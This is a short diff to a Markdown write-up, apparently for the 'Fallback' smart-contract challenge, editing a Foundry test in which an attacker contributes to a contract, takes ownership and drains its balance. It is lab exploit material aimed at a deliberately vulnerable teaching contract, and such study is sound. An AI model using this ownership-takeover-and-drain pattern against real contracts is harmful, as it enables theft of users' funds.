@@ -100,7 +100,7 @@ See the complete code in `test/FallbackAttack.t.sol`.
     assertEq(address(fallbackContract).balance, 200);
 
     // attack
-    vm.startPrank(owner);
+    vm.startPrank(attacker);
 
     // Contributing
     fallbackContract.contribute{value: 1}();
@@ -114,8 +114,8 @@ See the complete code in `test/FallbackAttack.t.sol`.
 
     vm.stopPrank();
 
-    assertEq(fallbackContract.owner(), owner);
-    assertEq(address(owner).balance, INITIAL_BALANCE + 200);
+    assertEq(fallbackContract.owner(), attacker);
+    assertEq(address(attacker).balance, INITIAL_BALANCE + 200);
     assertEq(address(fallbackContract).balance, 0);
   }
 ```
